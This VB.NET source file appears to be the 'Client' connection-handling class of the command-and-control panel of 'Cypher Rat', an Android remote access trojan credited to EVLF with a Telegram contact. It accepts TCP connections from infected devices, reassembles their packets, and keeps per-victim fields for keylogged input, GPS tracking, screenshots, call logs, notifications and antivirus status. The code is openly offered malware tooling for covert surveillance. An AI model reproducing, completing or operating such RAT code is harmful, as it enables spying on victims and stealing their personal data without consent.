Imports System.Net.Sockets
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Namespace sockets
    Public Class Client
        Public Keys As String
        Public ClientAddressIP As String
        Public ClientRemoteAddress As String
        Public ActiveNow As String
        Public ClientLocalAddress As String
        Public buffer As Byte()
        Public MemoryStream As IO.MemoryStream
        Public Maxsize As Long
        Public isconnected As Boolean = Nothing
        Public Count As Integer
        Public ScreenSize As Size
        Public SizeData As Object()
        Public Card As ClientCard = Nothing
        Public qit, qitGPS, shot, Keylogg As Boolean
        Public Flag As Bitmap
        Public Screen As Bitmap
        Public Battery As Bitmap
        Public Country As String = "null"
        Public android As String = "null"
        Public ClientName As String = "null"
        Public UUID As String = "null"
        Public FolderUSER As String = "null"
        Public host As String = "null"
        Public Statistics As String = "null"
        Public BatteryCharge As String = "null"
        Public CALLS As String = "null"
        Public SyncData As List(Of Object()) = New List(Of Object())
        Public Workers() As ComponentModel.BackgroundWorker
        Public ID As Integer = 0
        Private ReadOnly Lock As Object = New Object()
        Public EXI As Boolean = False
        Public Wallpaper(2) As Object
        Public power As Boolean = False
        Public isnewnotifi As Boolean = False
        Public CountPoing As Integer = 0
        Public VersionClient As String = "n/a"
        Public mysocket As Accept
        Public myClient As Net.Sockets.TcpClient
        Public uptime As Integer
        Public ClientDefender As String
        Public Notifications As String() = New String(100) {}
        Public isready As Boolean = False
        Public MaxPower As Boolean = False
        Public Resone As String = ""
        Public Wifi As Bitmap
        Public MyTimer As System.Threading.Timer = Nothing
        Public Sub New(ByVal ParametersClient As Net.Sockets.TcpClient, ByVal ParametersInteger As Integer, sk As Accept)
            Try
                Me.mysocket = sk
                Me.myClient = ParametersClient
                Me.myClient.Client.ReceiveTimeout = -1
                Me.myClient.Client.SendTimeout = -1
                Me.myClient.Client.SendBufferSize = 99999
                Me.myClient.Client.ReceiveBufferSize = 99999
                Me.ClientRemoteAddress = CType(ParametersClient.Client.RemoteEndPoint, Net.IPEndPoint).ToString()
                Me.ClientAddressIP = CType(ParametersClient.Client.RemoteEndPoint, Net.IPEndPoint).Address.ToString()
                Me.ClientLocalAddress = String.Format("{0}:{1}", Me.ClientAddressIP, CStr(ParametersInteger))
                Me.isconnected = True
                Me.uptime = 60
                Me.isready = False
                Me.Wallpaper(0) = Nothing
                Me.Screen = My.Resources.OFF
                Me.Battery = Nothing
                Me.Wifi = Nothing
                Me.Wallpaper(1) = Nothing
                Me.Maxsize = -1
                Me.Count = -1
                Me.shot = True
                Me.qitGPS = False
                Me.qit = False
                Me.Keylogg = False
                Me.Keys = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0"
                Me.Card = Nothing
                Me.MemoryStream = New IO.MemoryStream
                Me.buffer = New Byte(1 - 1) {}
                Me.SizeData = {-1, -1}
                Me.myClient.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Me.DataRecievedAsync), Me.myClient)
            Catch ex As Exception
                Me.Close(ParametersClient, "Error new client" + ex.Message)
            End Try
            Return
        End Sub
        Friend Sub StartBing()
            Dim o As New AutoResetEvent(False)
            Me.MyTimer = New Timer(AddressOf Me.outtimer, o, 15000, 15000)
        End Sub
        Sub outtimer(o As Object)
            Try
                If Not Me.isconnected Then
                    Me.Close(Me.myClient, "")

                End If
            Catch ex As Exception
                Me.Close(Me.myClient, "")
            End Try
        End Sub
        Public Sub SendAsync(ByVal ParametersObjects As Object())
            Try
                Thread.Sleep(1)

                Dim bByte As Byte() = Codes.FormatPacket(DirectCast(ParametersObjects(1), String),
                                                       DirectCast(ParametersObjects(2), Byte()))

                ThreadPool.QueueUserWorkItem(New WaitCallback(Sub() Sender(bByte)), bByte)
            Catch ex As Exception
            End Try
        End Sub
        Public Sub Sender(ByVal bByte As Byte())
            Dim reciveThread As New Thread(
          Sub()
              Dim client2 As Object = Me
              SyncLock client2

                  Thread.Sleep(1)

                  Try

                      If Not Me.isconnected Then
                          Return
                      End If


                      Me.myClient.Client.Poll(-1, Net.Sockets.SelectMode.SelectWrite)

                      Me.myClient.Client.SendBufferSize = bByte.Length

                      Me.myClient.Client.Send(bByte, 0, bByte.Length, Net.Sockets.SocketFlags.None)


                      Me.mysocket.BytesSent += bByte.Length




                  Catch SocketException As Net.Sockets.SocketException
                      Me.isconnected = False
                  Catch SocketDisposed As System.ObjectDisposedException
                      Me.isconnected = False
                  End Try


              End SyncLock

              Return

          End Sub)
            reciveThread.IsBackground = True
            reciveThread.Start()

        End Sub
        Public Sub DataRecievedAsync(ByVal ar As IAsyncResult)
            If Not Me.isconnected Then
                GoTo out
            End If
            Try
                Dim DataSize As Integer = 0
                Try
                    Me.myClient = CType(ar.AsyncState, Net.Sockets.TcpClient)
                    DataSize = Me.myClient.Client.EndReceive(ar)
                Catch edis As ObjectDisposedException
                    Resone = "Timeout"
                    Me.isconnected = False
                    GoTo out
                Catch ex As SocketException
                    Resone = "Timeout"
                    Me.isconnected = False
                    GoTo out
                End Try
                If DataSize > 0 Then
                    Me.mysocket.BytesReceived += DataSize
                    If Maxsize = -1 Then
                        If Me.buffer(0) = 0 Then
                            Me.MemoryStream.WriteByte(Me.buffer(0))
                            Count += 1
                            If Count = 1 Then
                                Dim GetSize As String = Codes.Encoding().GetString(Me.MemoryStream.ToArray).Trim
                                Dim SPL As String() = GetSize.Split({ChrW(0)}, StringSplitOptions.None)
                                Dim SSize As Long = If(IsNumeric(SPL(0).Trim), CLng(SPL(0).Trim), 0)
                                Dim BSize As Long = If(IsNumeric(SPL(1).Trim), CLng(SPL(1).Trim), 0)
                                SizeData = {SSize, BSize}
                                Maxsize = SSize + BSize
                                Dim CRB As Long = Maxsize
                                Me.myClient.Client.ReceiveBufferSize = CRB
                                Count = -1
                                Me.buffer = New Byte((CInt((Me.Maxsize - 1)) + 1) - 1) {}
                                Me.MemoryStream.Dispose()
                                Me.MemoryStream = New IO.MemoryStream
                            End If
                            GoTo loppit
                        Else
                            Me.MemoryStream.WriteByte(Me.buffer(0))
                        End If
                    Else
                        Me.MemoryStream.Write(Me.buffer, 0, DataSize)
                        If Me.MemoryStream.ToArray.Length = Maxsize Then
                            Dim i As ListData
                            SyncLock Me.mysocket.RequestsReceiver
                                i = New ListData(Me, Me.MemoryStream.ToArray, SizeData, Me.myClient)
                                Me.mysocket.RequestsReceiver.Add(i)
                            End SyncLock
                            Do While Not i.wait
                                Thread.Sleep(1)
                            Loop
                            Me.MemoryStream.Dispose()
                            Me.MemoryStream = New IO.MemoryStream
                            SizeData = {-1, -1}
                            Maxsize = -1
                            Me.buffer = New Byte(1 - 1) {}
                            GoTo loppit
                        Else
                            Me.buffer = New Byte((CInt(((Me.Maxsize - Me.MemoryStream.Length) - 1)) + 1) - 1) {}
                        End If
                    End If
loppit:
                    If Me.myClient.Client.Connected Then
                        Try
                            Me.myClient.Client.BeginReceive(Me.buffer, 0, Me.buffer.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf Me.DataRecievedAsync), Me.myClient)
                        Catch ex As System.Exception
                            Resone = "Timeout"
                            Me.isconnected = False
                            GoTo out
                        End Try
                    Else
                        Resone = "Disconnected"
                        Me.isconnected = False
                        GoTo out
                    End If
                End If
            Catch ex As Exception
                Resone = "Disconnected"
                Me.isconnected = False
            End Try
out:
        End Sub
        Public Async Sub Close(ByVal Client As Net.Sockets.TcpClient, Reson As String)
            Me.isconnected = False
            EXI = True
            If Me.MyTimer IsNot Nothing Then
                Me.MyTimer.Dispose()
            End If
            Await Task.Factory.StartNew(Function() Disconnect(Client), TaskCreationOptions.None)
        End Sub
        Private Function Disconnect(ByVal Client As Net.Sockets.TcpClient)
            If Me.MemoryStream IsNot Nothing Then
                Try
                    Me.MemoryStream.Dispose()
                Catch ex As Exception
                End Try
            End If
            If Client IsNot Nothing Then
                Try
                    If Client.Client.Connected Then
                        Client.GetStream.Close()
                    End If
                Catch ex As Exception
                End Try
            End If
            If Client IsNot Nothing Then
                Try
                    If Client.Client.Connected Then
                        Client.Client.Close()
                    End If
                Catch ex As Exception
                End Try
            End If
            If Me.Card IsNot Nothing Then
                Data.LOGIT(Me, "Disconnected")
                Me.mysocket.RemoveRow(Me)
            End If
            If Me.ClientRemoteAddress IsNot Nothing Then
                SyncLock Data.SyncClientsOnline
                    If Me.mysocket.ClientsOnline.Contains(Me.ClientRemoteAddress) Then
                        Me.mysocket.ClientsOnline.Remove(Me.ClientRemoteAddress)
                    End If
                End SyncLock
            End If
            Return Nothing
        End Function
        Public Function Progresr() As Integer
            Dim vul As Integer
            If Me.Maxsize = -1 Then
                Return vul
            End If
            Try
                vul = RateConverter(CInt(Me.MemoryStream.Length), CInt(Me.Maxsize))
                Return vul
            Catch ex As System.ObjectDisposedException
                Return 0
            End Try
        End Function
        Public Function RateConverter(ByVal Value As Integer, ByVal Totalsize As Integer) As Integer
            Try
                If Totalsize = 0 Then
                    Return 0
                End If
                Return CInt(Math.Round(CDbl(((CDbl(Value) / CDbl(Totalsize)) * 100))))
            Catch ex As Exception
                Return 0
            End Try
        End Function
        Private Sub EndSend(ByVal ar As IAsyncResult)
            Try
                Dim Client As Net.Sockets.TcpClient = CType(ar.AsyncState, Net.Sockets.TcpClient)
                Client.Client.EndSend(ar)
            Catch nextError As Exception
                Me.isconnected = False
            End Try
        End Sub
    End Class
End Namespace
